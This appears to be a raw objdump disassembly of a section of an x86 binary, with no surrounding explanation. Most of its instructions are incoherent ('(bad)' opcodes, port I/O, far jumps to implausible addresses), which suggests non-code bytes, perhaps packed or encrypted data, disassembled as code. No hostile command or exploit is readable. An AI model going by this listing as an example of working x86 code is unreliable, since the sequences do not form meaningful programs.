  404d3f:	fdivr  DWORD PTR [ecx]
  404d41:	or     BYTE PTR [ebp-0x1687a715],bh
  404d47:	add    esi,DWORD PTR ds:0x4d7ede9b
  404d4d:	pop    esp
  404d4e:	jmp    0x320cf356
  404d53:	inc    ebx
  404d54:	ds repz pop es
  404d57:	dec    esp
  404d58:	jg     0x404db5
  404d5a:	adc    DWORD PTR [ecx+0x2],0xfe0c867e
  404d61:	dec    ebp
  404d62:	sar    BYTE PTR gs:[esi],cl
  404d65:	pop    ebx
  404d66:	add    cl,ch
  404d68:	mov    edx,0x9648daa
  404d6d:	outs   dx,BYTE PTR ds:[esi]
  404d6e:	jmp    DWORD PTR [esi+0xd]
  404d71:	sub    eax,ebp
  404d73:	call   0x4dfd:0xe2ff7de9
  404d7a:	test   BYTE PTR [ebx],dh
  404d7c:	cmp    eax,0x3870005b
  404d81:	jnp    0x404d72
  404d83:	add    BYTE PTR ds:[eax],al
	...
  404dae:	xchg   esi,eax
  404daf:	iret   
  404db0:	test   DWORD PTR [ecx-0x6a],eax
  404db3:	jge    0x404db4
  404db5:	cdq    
  404db6:	adc    eax,0x3da848e8
  404dbb:	jle    0x404d72
  404dbd:	or     DWORD PTR [esi+0x4381ff7d],esp
  404dc3:	pop    ebx
  404dc4:	add    BYTE PTR [ecx-0x6b],ch
  404dc7:	lods   al,BYTE PTR ds:[esi]
  404dc8:	sti    
  404dc9:	push   es
  404dca:	xchg   esi,eax
  404dcb:	push   ecx
  404dcc:	shr    dh,0xf1
  404dcf:	mov    bh,0x0
  404dd1:	jmp    0xe9392813
  404dd6:	ss aad 0x9c
  404dd9:	jmp    0xde90a91b
  404dde:	scas   eax,DWORD PTR es:[edi]
  404ddf:	jb     0x404dd0
  404de1:	(bad)  
  404de2:	jno    0x404e0e
  404de4:	call   DWORD PTR [edx+ebp*2+0x2ac6ff6d]
  404deb:	inc    esp
  404dec:	cmc    
  404ded:	mov    esi,0xc185cf09
  404df2:	and    DWORD PTR [ebp-0x1],edi
  404df5:	sbb    DWORD PTR [edx+0x422848b6],edx
  404dfb:	jl     0x404db2
  404dfd:	mov    DWORD PTR [ecx],ebx
  404dff:	jge    0x404e00
  404e01:	add    DWORD PTR [ebx+ebx*2],edi
  404e04:	add    BYTE PTR [ecx+0x12],ch
  404e07:	out    dx,al
  404e08:	cli    
  404e09:	add    al,al
  404e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e0c:	or     eax,eax
  404e0e:	jmp    0x404e4c
  404e10:	cmp    DWORD PTR [ebp+0x0],0x0
	...
  404e3b:	add    BYTE PTR [edi-0x2900008c],bh
  404e41:	push   cs
  404e42:	cmp    edx,DWORD PTR [eax-0x69]
  404e45:	rol    DWORD PTR [ebp-0x5b7f04],cl
  404e4b:	push   eax
  404e4c:	jg     0x404dd4
  404e4e:	loop   0x404e50
  404e50:	xlat   BYTE PTR ds:[ebx]
  404e51:	dec    eax
  404e52:	lea    eax,[ebp-0x8bfd]
  404e58:	xlat   BYTE PTR ds:[ebx]
  404e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e5a:	mov    ch,0xec
  404e5c:	add    BYTE PTR [edi+edi*8-0x549e18],ah
  404e63:	(bad)  
  404e64:	jg     0x404e0b
  404e66:	mov    ch,0xe8
  404e68:	inc    eax
  404e69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e6a:	call   DWORD PTR [eax+0x30]
  404e6d:	jmp    0xdbe8:0xa430efec
  404e74:	jnp    0x404e1b
  404e76:	(bad)  
  404e77:	call   0x3fef13
  404e7c:	cmp    al,0x37
  404e7e:	lea    eax,[ebp-0x8aad]
  404e84:	pop    ss
  404e85:	outs   dx,DWORD PTR ds:[esi]
  404e86:	fsub   st,st(2)
  404e88:	addr16 pop eax
  404e8a:	inc    eax
  404e8b:	push   eax
  404e8c:	loop   0x404e68
  404e8e:	cld    
  404e8f:	out    dx,eax
  404e90:	jo     0x404e37
  404e92:	push   eax
  404e93:	(bad)  
  404e94:	mov    edx,0xf0ffef74
  404e99:	outs   dx,DWORD PTR ds:[esi]
  404e9a:	mov    ah,0xf4
  404e9c:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e9e:	call   0x404f8c
	...
  404ec7:	add    BYTE PTR [eax],al
  404ec9:	add    al,ch
  404ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ecc:	(bad)  
  404ecd:	(bad)  
  404ece:	jp     0x404f48
  404ed0:	out    dx,eax
  404ed1:	push   DWORD PTR [eax+0x3ef7de6f]
  404ed7:	in     eax,0xd6
  404ed9:	(bad)  
  404eda:	mov    ebx,0xf9ffe6e5
  404edf:	jmp    0x75d5:0xfcf1fe8e
  404ee6:	jmp    0x6972:0x3ee3ced9
  404eed:	add    cl,bl
  404eef:	(bad)  
  404ef1:	out    dx,eax
  404ef2:	rcr    DWORD PTR [ebx+ebp*8],1
  404ef5:	outs   dx,DWORD PTR ds:[esi]
  404ef6:	shl    BYTE PTR [esi+edx*8],cl
  404ef9:	push   0x3e
  404efb:	or     eax,0x14a9ec90
  404f00:	(bad)  
  404f01:	call   0x169522
  404f06:	mov    ebx,0xa1efdeee
  404f0b:	sub    al,0x33
  404f0d:	call   ebx
  404f0f:	popa   
  404f10:	out    0xff,al
  404f12:	xchg   ecx,eax
  404f13:	imul   edi,DWORD PTR [edx-0x1d],0xc080723e
  404f1a:	push   es
  404f1b:	mov    ecx,0x646eb5d6
  404f20:	(bad)  
  404f21:	jmp    DWORD PTR [esi-0x33]
  404f24:	out    0xff,al
  404f26:	imul   edi,edx,0x6c51e87f
  404f2c:	aad    0xff
	...
  404f56:	add    BYTE PTR [eax],al
  404f58:	xchg   ebx,eax
  404f59:	test   eax,0xa951ffe5
  404f5e:	outs   dx,BYTE PTR ds:[esi]
  404f5f:	test   DWORD PTR [ecx-0x5c],0x32f659a1
  404f66:	add    al,0xff
  404f68:	repz test al,0xe5
  404f6b:	push   DWORD PTR [ecx]
  404f6d:	lea    ecx,[ecx-0x1e]
  404f70:	test   BYTE PTR ds:[eax],cl
  404f73:	shr    BYTE PTR [edx+0x268d888d],0x5c
  404f7a:	xchg   esi,eax
  404f7b:	aad    0x11
  404f7d:	out    0x99,eax
  404f7f:	mov    DWORD PTR [ebx+0x14],ecx
  404f82:	and    DWORD PTR [ebx+0x3e],eax
  404f85:	outs   dx,BYTE PTR ds:[esi]
  404f86:	inc    ebp
  404f87:	aad    0xb3
  404f89:	jg     0x404f21
  404f8b:	aad    0xf1
  404f8d:	cmp    DWORD PTR [ebx+0x645b3ee1],0x7f
  404f94:	fimul  DWORD PTR [edx+0x7a6ed56e]
  404f9a:	pushf  
  404f9b:	call   0xec9eca81
  404fa0:	add    al,0x7e
  404fa2:	jmp    0xd1dc0aaa
  404fa7:	dec    eax
  404fa8:	mov    ecx,0xb1e555b0
  404fad:	jp     0x405000
  404faf:	or     DWORD PTR [ecx-0x4474c986],ebx
  404fb5:	cmp    DWORD PTR [esi],0xffffffd5
  404fb8:	cdq    
  404fb9:	jp     0x405017
  404fbb:	in     al,dx
	...
  404fe4:	add    BYTE PTR [eax],al
  404fe6:	mov    eax,ds:0x53ec1e7a
  404feb:	jb     0x405003
  404fed:	aad    0xdd
  404fef:	sbb    BYTE PTR [ecx+0x3c7a3e42],ah
  404ff5:	loopne 0x405058
  404ff7:	jp     0x404ff7
  404ff9:	jmp    0x40504f
  404ffb:	jl     0x404fe6
  404ffd:	add    esi,DWORD PTR ds:0xc4f8759b
  405003:	call   0x7a9234d9
  405008:	jb     0x404fdd
  40500a:	mov    ch,0x38
  40500c:	xor    al,0x4c
  40500e:	call   FWORD PTR [edx-0x26]
  405011:	lahf   
  405012:	cmp    DWORD PTR [eax+0x7a31e4cd],esi
  405018:	shl    DWORD PTR [edx-0x16ffa4e1],1
  40501e:	or     dh,BYTE PTR [eax+0x79f2bef0]
  405024:	call   0xffba6833
  405029:	sahf   
  40502a:	mov    eax,0xea96ef86
  40502f:	sbb    BYTE PTR [eax+0x7f],0x12
  405033:	jp     0x405094
  405035:	daa    
  405036:	add    eax,0xe172559e
  40503b:	add    al,0x8
  40503d:	sbb    edi,0xc66eff70
  405043:	mov    bh,bh
  405045:	sbb    al,0xc3
  405047:	and    al,BYTE PTR [ecx-0x17]
	...
  405072:	add    BYTE PTR [eax],al
  405074:	ret    0xff5c
  405077:	fdiv   QWORD PTR ds:0xc4e542ea
  40507d:	dec    edi
  40507e:	mov    bh,0xb1
  405080:	cld    
  405081:	pop    edx
  405082:	leave  
  405083:	sub    ebp,DWORD PTR [ecx-0x669dab87]
  405089:	ffree  st(4)
  40508b:	xor    DWORD PTR [edx-0x5e],ebp
  40508e:	inc    ebp
  40508f:	and    DWORD PTR ds:0xbee9005b,edi
  405095:	test   DWORD PTR [edi],0xff4cf1e9
  40509b:	xchg   esp,eax
  40509c:	inc    ecx
  40509d:	jp     0x405114
  40509f:	icebp  
  4050a0:	out    0x5a,eax
  4050a2:	call   0xffb9d8a3
  4050a7:	pusha  
  4050a8:	and    BYTE PTR [edi-0x15],dh
  4050ab:	out    0x9a,al
  4050ad:	pop    ds
  4050ae:	cld    
  4050af:	jmp    0x7240abf1
  4050b4:	das    
  4050b5:	mov    dl,0x48
  4050b7:	sub    BYTE PTR [edx],bh
  4050b9:	xchg   BYTE PTR [ebx],dl
  4050bb:	bound  eax,QWORD PTR [edi+0x60003b77]
  4050c1:	arpl   WORD PTR [ebp+0x9],si
  4050c4:	loopne 0x4050e8
  4050c6:	clc    
  4050c7:	add    DWORD PTR [edi],edx
  4050c9:	pop    ebp
  4050ca:	add    bl,ch
  4050cc:	and    edx,edi
  4050ce:	ds or  ebx,eax
  4050d1:	adc    ch,cl
  4050d3:	sub    DWORD PTR [edx],0xffffffa7
  4050d6:	add    BYTE PTR [ebp+0x0],dh
	...
  405101:	add    BYTE PTR [edi],bl
  405103:	mov    ?,WORD PTR [ebp-0x4]
  405106:	mov    edi,0xb8ffffe1
  40510b:	clc    
  40510c:	inc    esp
  40510d:	clc    
  40510e:	dec    eax
  40510f:	mov    dh,0xc2
  405111:	or     bh,dl
  405113:	xor    eax,0x37103d8b
  405118:	inc    ecx
  405119:	add    BYTE PTR [edi+esi*2+0x56],ch
  40511d:	mov    ebp,DWORD PTR [eax]
  40511f:	xchg   edi,eax
  405120:	imul   BYTE PTR ds:[eax-0x74]
  405124:	or     edi,edi
  405126:	xchg   edx,eax
  405127:	nop
  405128:	mov    DWORD PTR ds:0x413730,0x5c97
  405132:	enter  0x55a1,0x8b
  405136:	pop    ebx
  405137:	xor    al,0x56
  405139:	push   0xffffffa7
  40513b:	lea    esi,[ebp+0x8]
  40513e:	das    
  40513f:	int    0xf9
  405141:	jmp    FWORD PTR [eax]
  405143:	clc    
  405144:	idiv   edi
  405146:	shl    BYTE PTR [edi+eiz*8-0x15],cl
  40514a:	inc    edi
  40514b:	pop    edi
  40514c:	add    BYTE PTR [ebx+0xf765e3f],al
  405152:	rcr    ah,0x3f
  405155:	and    dl,dl
  405157:	jae    0x405154
  405159:	(bad)  
  40515a:	lock pop ebp
  40515c:	mov    ecx,eax
  40515e:	rcr    BYTE PTR fs:[edi+0x68],0x3e
  405163:	int    0x3b
  405165:	inc    ecx
	...
  40518e:	add    BYTE PTR [eax],al
  405190:	ds xor esp,ebx
  405193:	push   0x1c
  405195:	add    BYTE PTR [ebx],0xb
  405198:	(bad)  
  405199:	sub    eax,0x867ec608
  40519e:	add    ebp,DWORD PTR [edx+0x7a]
  4051a1:	sbb    al,0x4
  4051a3:	push   edi
  4051a4:	es and dh,ah
  4051a7:	add    BYTE PTR [esi],bh
  4051a9:	ins    DWORD PTR es:[edi],dx
  4051aa:	ret    
  4051ab:	je     0x4051e8
  4051ad:	enter  0x3,0xe5
  4051b1:	test   cl,cl
  4051b3:	pop    es
  4051b4:	ds pop ecx
  4051b6:	fsubr  QWORD PTR [eax-0x7cfc7e22]
  4051bc:	out    0x84,al
  4051be:	pop    edx
  4051bf:	add    eax,DWORD PTR [eax]
  4051c1:	add    DWORD PTR [ebx],0x329ff98b
  4051c7:	leave  
  4051c8:	cld    
  4051c9:	jge    0x4051ce
  4051cb:	push   ebp
  4051cc:	mov    ch,0x1d
  4051ce:	xchg   ah,al
  4051d0:	mov    edx,0x3b0c47fc
  4051d5:	xor    bl,0xff
  4051d8:	test   eax,0xabc5dbd1
  4051dd:	xor    dl,dl
  4051df:	mov    DWORD PTR [ebx],eax
  4051e1:	inc    esi
  4051e2:	shl    BYTE PTR [ebp+0x42],cl
  4051e5:	inc    ecx
  4051e6:	pop    eax
  4051e7:	cld    
  4051e8:	mov    esi,ecx
  4051ea:	sti    
  4051eb:	out    0x95,eax
  4051ed:	push   esi
  4051ee:	sar    bh,cl
  4051f0:	jns    0x4051c0
  4051f2:	repz inc BYTE PTR [eax]
	...
  40521d:	add    bl,ch
  40521f:	ins    DWORD PTR es:[edi],dx
  405220:	shl    BYTE PTR [ebp+0x6a],cl
  405223:	dec    ecx
  405224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405225:	or     DWORD PTR [esi],edi
  405227:	adc    dl,0x75
  40522a:	pop    edx
  40522b:	pop    ecx
  40522c:	mov    dh,ch
  40522e:	push   ecx
  40522f:	pop    edx
  405230:	out    0xbb,al
  405232:	jl     0x40529a
  405234:	jmp    0x3fc7076f
  405239:	xor    eax,0xfc547691
  40523e:	sbb    ebp,edx
  405240:	leave  
  405241:	add    al,0x3e
  405243:	retf   
  405244:	bnd ret 
  405246:	stos   DWORD PTR es:[edi],eax
  405247:	pop    esi
  405248:	push   ss
  405249:	sub    eax,0xfcaba478
  40524e:	adc    edx,esp
  405250:	and    al,0xfc
  405252:	mov    ecx,0xb574c1e2
  405257:	lock in al,0x1c
  40525a:	(bad)  
  40525b:	ja     0x4052ad
  40525d:	shl    ecx,1
  40525f:	jbe    0x4051e7
  405261:	je     0x40524f
  405263:	lds    ebx,FWORD PTR [ecx-0x7c]
  405266:	and    DWORD PTR [ebx-0x3],ebx
  405269:	jmp    0x5bde:0x53810a70
  405270:	jmp    0xe630dc71
  405275:	xor    BYTE PTR [ebp+0x15],ah
  405278:	and    dh,al
  40527a:	inc    esi
  40527b:	pop    ebx
  40527c:	pusha  
  40527d:	or     bh,BYTE PTR [ebp+0xdced9d]
	...
  4052ab:	add    BYTE PTR [eax+0x3e03e8b3],dl
  4052b1:	pop    ebx
  4052b2:	xchg   esi,eax
  4052b3:	sub    al,0xf8
  4052b5:	mov    ds:0xfe91fc2b,eax
  4052ba:	lea    edi,[edi+edi*8]
  4052bd:	pop    edx
  4052be:	xchg   ecx,eax
  4052bf:	inc    edi
  4052c0:	neg    DWORD PTR [ebx]
  4052c2:	jmp    0xeb724a2
  4052c7:	shl    esi,1
  4052c9:	lds    esi,FWORD PTR [edx+0x54033e42]
  4052cf:	call   FWORD PTR ds:[edx+0x0]
  4052d3:	add    edx,ebx
  4052d5:	jne    0x4052d6
  4052d7:	out    dx,al
  4052d8:	cmc    
  4052d9:	add    DWORD PTR [ebx+0x28],ecx
  4052dc:	inc    edx
  4052dd:	add    ebx,DWORD PTR [esi+0x30]
  4052e0:	std    
  4052e1:	pop    edx
  4052e2:	call   0xffb66237
  4052e7:	inc    ecx
  4052e8:	adc    eax,0x85e94122
  4052ed:	mov    ds:0x833a284b,al
  4052f2:	push   0xffffffb6
  4052f4:	out    dx,al
  4052f5:	jne    0x40535f
  4052f7:	push   cs
  4052f8:	push   ebx
  4052f9:	sbb    al,0x0
  4052fb:	adc    DWORD PTR ds:0xe5e94123,edx
  405301:	adc    edi,edi
  405303:	xchg   esi,eax
  405304:	push   cs
  405305:	add    edx,DWORD PTR [edi+0x22]
  405308:	jge    0x405365
  40530a:	push   0x1c25a0
  40530f:	xchg   ecx,eax
	...
  405338:	add    BYTE PTR [eax],al
  40533a:	and    DWORD PTR [esi-0x1],esi
  40533d:	jbe    0x4053b4
  40533f:	call   0xb217:0x33a284b
  405346:	jl     0x4053a3
  405348:	call   0xffb64269
  40534d:	rol    DWORD PTR [esi+0x15e94121],0x30
  405354:	dec    ebx
  405355:	test   al,0x3d
  405357:	sub    DWORD PTR [esi],0x3e
  40535a:	mov    ?,WORD PTR [ebp-0x3d]
  40535d:	pushf  
  40535e:	sbb    al,BYTE PTR [edi+0x6095a48b]
  405364:	rcr    BYTE PTR [ebp-0x16c724c0],0xe8
  40536b:	arpl   WORD PTR [eax+0x5b3de9],di
  405371:	and    BYTE PTR [ebx+0x5e],bh
  405374:	add    BYTE PTR [eax],al
  405376:	mov    WORD PTR [edi+0x61d717eb],gs
  40537c:	pop    esp
  40537d:	je     0x4053e9
  40537f:	fnstcw WORD PTR [eax]
  405381:	das    
  405382:	retf   0xba62
  405385:	add    DWORD PTR [edi+0x59],edx
  405388:	add    bl,ch
  40538a:	pop    edx
  40538b:	jecxz  0x40538d
  40538d:	add    BYTE PTR [edi],ah
  40538f:	pop    ecx
  405390:	inc    eax
  405391:	or     BYTE PTR [edi+0x5f],0x75
  405395:	in     al,0xac
  405397:	cdq    
  405398:	leave  
  405399:	ret    0x591b
  40539c:	push   ebp
  40539d:	mov    eax,DWORD PTR [eax]
	...
  4053c7:	add    BYTE PTR [ebx],al
  4053c9:	sub    eax,0x229c5356
  4053ce:	or     al,0x5
  4053d0:	pop    ss
  4053d1:	pop    ebp
  4053d2:	add    BYTE PTR [eax],al
  4053d4:	(bad)  
  4053d5:	jg     0x405427
  4053d7:	call   0x3fe730
  4053dc:	pop    esp
  4053dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053de:	mov    ebx,eax
  4053e0:	ins    BYTE PTR es:[edi],dx
  4053e1:	adc    cl,BYTE PTR [eax]
  4053e3:	mov    edx,DWORD PTR [edx]
  4053e5:	pop    ebx
  4053e6:	jmp    0x4053ea
  4053e8:	mov    esi,DWORD PTR [esi]
  4053ea:	or     ecx,ecx
  4053ec:	retf   
  4053ed:	arpl   WORD PTR [eax-0xaec32c2],ax
  4053f3:	or     ecx,DWORD PTR [esi]
  4053f5:	adc    eax,DWORD PTR [edx]
  4053f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053f8:	ficom  WORD PTR [ecx-0x40]
  4053fb:	stos   BYTE PTR es:[edi],al
  4053fc:	sbb    dh,BYTE PTR [esi-0x67d3198b]
  405402:	pop    ebx
  405403:	pop    esi
  405404:	shl    BYTE PTR [edi+0x29a708c2],0x56
  40540b:	mov    ecx,0x589b
  405410:	pop    es
  405411:	dec    eax
  405412:	rcl    BYTE PTR [eax-0x536f3e9c],cl
  405418:	ds repnz (bad) 
  40541b:	mov    ch,0x7e
  40541d:	(bad)  
  405420:	into   
  405421:	test   DWORD PTR [eax+edx*4],0x900e40bd
  405428:	std    
  405429:	lods   eax,DWORD PTR ds:[esi]
  40542a:	push   ds
  40542b:	nop
	...
  405454:	add    BYTE PTR [eax],al
  405456:	retf   
  405457:	jnp    0x4054cc
  405459:	cmp    DWORD PTR [ebp+edi*1+0x74],0x43
  40545e:	add    dl,BYTE PTR [edx+0x74]
  405461:	jl     0x4054a7
  405463:	dec    esi
  405464:	or     eax,0x77fb190
  405469:	add    al,0x3d
  40546b:	rol    BYTE PTR [edx+0x3c],cl
  40546e:	jg     0x405482
  405470:	dec    edi
  405471:	or     ebx,DWORD PTR [edx+0x48]
  405474:	je     0x4054f5
  405476:	cmp    BYTE PTR [esi+0x44],dh
  405479:	nop
  40547a:	cmp    eax,0x9f3c42b2
  40547f:	repnz dec esi
  405481:	or     bh,BYTE PTR [edx]
  405483:	dec    eax
  405484:	je     0x405505
  405486:	cmp    esi,DWORD PTR [esi+0x410e0346]
  40548c:	(bad)
  40548f:	loopne 0x405425
  405491:	rol    DWORD PTR [esp+eax*4],0x7a
  405495:	ret    0xba41
  405498:	(bad)  
  405499:	call   0x8bb3fdd4
  40549e:	cmc    
  40549f:	icebp  
  4054a0:	sub    al,0x5b
  4054a2:	jge    0x40545a
  4054a4:	jp     0x405492
  4054a6:	or     eax,0xb5fc35ad
  4054ab:	mov    dh,0xfb
  4054ad:	(bad)  
  4054ae:	mov    ch,0xb6
  4054b0:	repz pop ebp
  4054b3:	mov    esi,0x494d8fff
  4054b8:	loop   0x4054dc
	...
  4054e2:	add    BYTE PTR [eax],al
  4054e4:	scas   al,BYTE PTR es:[edi]
  4054e5:	pop    edx
  4054e6:	mov    eax,0x1de89673
  4054eb:	into   
  4054ec:	jns    0x4054b8
  4054ee:	ins    BYTE PTR es:[edi],dx
  4054ef:	mov    esp,0xc44362f0
  4054f4:	push   esi
  4054f5:	bound  ebx,QWORD PTR [ecx+0x42]
  4054f8:	pop    esp
  4054f9:	jb     0x405554
  4054fb:	sub    al,0xae
  4054fd:	xlat   BYTE PTR ds:[ebx]
  4054fe:	das    
  4054ff:	pop    es
  405500:	scas   al,BYTE PTR es:[edi]
  405501:	xlat   BYTE PTR ds:[ebx]
  405502:	add    BYTE PTR [edi],al
  405504:	scas   al,BYTE PTR es:[edi]
  405505:	repz (bad) 
  405507:	je     0x4054be
  405509:	xchg   edi,eax
  40550a:	jns    0x40553a
  40550c:	cdq    
  40550d:	push   ss
  40550e:	mov    al,ds:0x345b42c2
  405513:	jns    0x40552f
  405515:	(bad)  [ebp-0x418cdf20]
  40551b:	xor    DWORD PTR [ebp-0x6a],esp
  40551e:	fs inc edi
  405520:	adc    cl,BYTE PTR [ecx+eax*2]
  405523:	les    esi,FWORD PTR [esi+0x1c]
  405526:	jmp    0x31c8a0f7
  40552b:	inc    ebx
  40552c:	xor    DWORD PTR ds:[ebx-0x53],0x3e
  405531:	pop    ebx
  405532:	loop   0x4054f7
  405534:	jae    0x405573
  405536:	xchg   BYTE PTR [edi+0x4e],dl
  405539:	jb     0x40552f
  40553b:	jmp    DWORD PTR [edi+0x5e]
  40553e:	add    eax,DWORD PTR [ecx+edx*8]
  405541:	call   0x6f942226
  405546:	push   ecx
  405547:	test   DWORD PTR [eax],eax
	...
  405571:	add    cl,ah
  405573:	pop    ebx
  405574:	jmp    0xe8294f71
  405579:	inc    eax
  40557a:	mov    cl,0xe8
  40557c:	dec    esp
  40557d:	fcomp  QWORD PTR [edx+edx*4]
  405580:	jmp    0xeed68a88
  405585:	xchg   BYTE PTR [ebx+0x3de9005b],al
  40558b:	loopne 0x405512
  40558d:	cmp    bh,BYTE PTR [eax+0x72]
  405590:	(bad)  
  405591:	mov    ecx,0xe90156e5
  405596:	cmp    eax,0x3a374d83
  40559b:	pop    ebx
  40559c:	or     ebp,DWORD PTR [ecx]
  40559e:	imul   ebx,esi,0xffffffac
  4055a1:	jmp    0xe57db0e3
  4055a6:	cmp    al,0x5b
  4055a8:	add    dh,ah
  4055aa:	mov    edx,0x3de900bc
  4055af:	add    eax,0x6eb87400
  4055b4:	(bad)  
  4055b5:	fimul  WORD PTR [edx]
  4055b7:	or     ebp,eax
  4055b9:	sbb    esp,eax
  4055bb:	pop    edx
  4055bc:	add    BYTE PTR [eax+eax*8+0x6d],bl
  4055c0:	inc    dh
  4055c2:	repnz or ch,al
  4055c5:	sub    DWORD PTR [eax],ecx
  4055c7:	jb     0x4055c8
  4055c9:	loop   0x4055c8
  4055cb:	out    0x1b,eax
  4055cd:	inc    ecx
  4055ce:	lods   eax,DWORD PTR ds:[esi]
  4055cf:	and    al,BYTE PTR [ecx-0x17]
  4055d2:	sbb    al,0xf3
  4055d5:	lahf   
	...
  4055fe:	add    BYTE PTR [eax],al
  405600:	or     dh,BYTE PTR [edx+0x50]
  405603:	add    DWORD PTR [edi-0x5710097],0x21907e7
  40560d:	cwde   
  40560e:	idiv   BYTE PTR [esi+0xa]
  405611:	xchg   BYTE PTR [edi],cl
  405613:	jbe    0x40567d
  405615:	arpl   WORD PTR [ebp-0x8f119c],cx
  40561b:	or     ax,0x6083
  40561f:	push   edi
  405620:	mov    dh,BYTE PTR [ecx-0x77]
  405623:	ins    BYTE PTR es:[edi],dx
  405624:	xchg   ecx,eax
  405625:	jo     0x405626
  405627:	dec    esi
  405628:	pop    es
  405629:	pop    ebx
  40562a:	push   0x0
  40562c:	xchg   edi,eax
  40562d:	adc    eax,DWORD PTR [edx]
  40562f:	push   0xffffffa7
  405631:	adc    eax,DWORD PTR [ebx]
  405633:	push   0xc0005da7
  405638:	pop    eax
  405639:	leave  
  40563a:	in     al,dx
  40563b:	(bad)  
  40563c:	pop    eax
  40563d:	lahf   
  40563e:	call   0x9e90a2
  405643:	mov    DWORD PTR [edx+0x6f7440a5],esp
  405649:	sahf   
  40564a:	jne    0x40565c
  40564c:	cmp    BYTE PTR [ecx],cl
  40564e:	or     al,0xff
  405650:	shl    BYTE PTR [ebp-0x60c50818],cl
  405656:	dec    DWORD PTR [ebx-0x78a60d1]
  40565c:	outs   dx,DWORD PTR ds:[esi]
  40565d:	xor    ebx,ebp
  40565f:	add    BYTE PTR [edi],ah
  405661:	jb     0x40563d
  405663:	jne    0x405665
	...
  40568d:	add    BYTE PTR [esi+eiz*4],bl
  405690:	mov    ch,0xec
  405692:	stc    
  405693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405694:	(bad)  
  405695:	call   0x411941
  40569a:	fmul   st,st(2)
  40569c:	in     al,dx
  40569d:	dec    al
  40569f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056a0:	call   0xffe51c0e
  4056a5:	mov    edx,esp
  4056a7:	inc    eax
  4056a8:	leave  
  4056a9:	ret    0x5ceb
  4056ac:	push   ebp
  4056ad:	mov    edi,DWORD PTR [ebx-0x46133b2a]
  4056b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056b4:	call   DWORD PTR [ebx-0x48]
  4056b7:	or     cl,BYTE PTR [edi+edi*8]
  4056ba:	shl    BYTE PTR [edi+eiz*2-0x40],cl
  4056be:	pop    ds
  4056bf:	push   ss
  4056c0:	add    bh,bh
  4056c2:	xchg   edx,eax
  4056c3:	stos   DWORD PTR es:[edi],eax
  4056c4:	dec    eax
  4056c5:	inc    ecx
  4056c6:	xlat   BYTE PTR ds:[ebx]
  4056c7:	xchg   esp,eax
  4056c8:	pop    edx
  4056c9:	cmc    
  4056ca:	sbb    BYTE PTR [ebx+ecx*1-0x7f86c140],ah
  4056d1:	fidivr DWORD PTR [esi]
  4056d3:	add    BYTE PTR [ebx],0x2b
  4056d6:	test   edi,esp
  4056d8:	sub    bh,0x98
  4056db:	xor    ebx,ecx
  4056dd:	push   eax
  4056de:	es jle 0x4056e5
  4056e1:	add    BYTE PTR [esi],bh
  4056e3:	sbb    dh,BYTE PTR [ebx]
  4056e5:	fnstsw WORD PTR [esi]
  4056e7:	cmp    dh,0xbf
  4056ea:	dec    ecx
  4056eb:	test   BYTE PTR [eax+0x8823e00],0x4
	...
  40571a:	add    BYTE PTR [eax],al
  40571c:	aas    
  40571d:	add    BYTE PTR [ebx],0xf
  405720:	mov    ecx,0x3e000434
  405725:	inc    DWORD PTR [eax-0x4]
  405728:	out    dx,al
  405729:	pop    ecx
  40572a:	pop    edi
  40572b:	jmp    0x85b8d879
  405730:	push   ecx
  405731:	js     0x4056fd
  405733:	dec    DWORD PTR [esi+0x31fd3a8a]
  405739:	mov    esi,edi
  40573b:	mov    edi,0xb15b7eb3
  405740:	jbe    0x405785
  405742:	add    al,0x8d
  405744:	ret    
  405745:	mov    al,ds:0x5211ffc9
  40574a:	fmul   QWORD PTR [ecx-0x353eed]
  405750:	mov    ebp,DWORD PTR [edx+0x33]
  405753:	call   0xb1e6a
  405758:	in     eax,0x78
  40575a:	retf   0x3675
  40575d:	jo     0xcb193852
  405763:	push   eax
  405764:	out    0x60,al
  405766:	sar    edi,1
  405768:	rcl    DWORD PTR [ecx-0x35],1
  40576b:	jne    0x405737
  40576d:	push   ecx
  40576e:	fsub   QWORD PTR ds:0xca665ad5
  405774:	inc    ebp
  405775:	fwait
  405776:	aad    0x36
  405778:	mov    cl,0xe5
  40577a:	push   esp
  40577b:	fcmovnbe st,st(0)
  40577d:	or     DWORD PTR [esi-0x36],0x0
	...
  4057a8:	add    BYTE PTR [eax],al
  4057aa:	mov    bh,0x15
  4057ac:	inc    ecx
  4057ad:	xchg   BYTE PTR [ebx],bl
  4057af:	jae    0x40579a
  4057b1:	dec    edi
  4057b2:	cld    
  4057b3:	(bad)  [edi+ecx*8-0x384b9012]
  4057ba:	xchg   esi,eax
  4057bb:	mov    ecx,0xd63e0344
  4057c0:	sub    DWORD PTR [ebx+0x2c],ecx
  4057c3:	jo     0x405761
  4057c5:	iret   
  4057c6:	push   esi
  4057c7:	in     eax,0x2c
  4057c9:	add    edi,DWORD PTR [esi]
  4057cb:	sub    DWORD PTR fs:[edi+0x20],ecx
  4057cf:	or     edi,esi
  4057d1:	dec    edi
  4057d2:	push   esi
  4057d3:	or     BYTE PTR [edx-0x2c],0x49
  4057d7:	outs   dx,DWORD PTR ds:[esi]
  4057d8:	bound  ebp,QWORD PTR [ebx-0x33a3901a]
  4057de:	lea    ecx,[ebx]
  4057e0:	shl    DWORD PTR [edi-0x362990d1],1
  4057e6:	mov    bl,0x67
  4057e8:	shr    DWORD PTR [ebx],0x2
  4057eb:	pop    esp
  4057ec:	jmp    0xbe9fdb6d
  4057f1:	dec    edi
  4057f2:	push   ss
  4057f3:	fucomip st,st(1)
  4057f5:	fist   DWORD PTR [esp+ebp*2-0x16fe3652]
  4057fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057fd:	(bad)  
  4057ff:	sbb    DWORD PTR [esi+0x329ac5c9],0xffffffbb
  405806:	cld    
  405807:	arpl   cx,bp
  405809:	cs mov ch,0x7f
  40580c:	push   ds
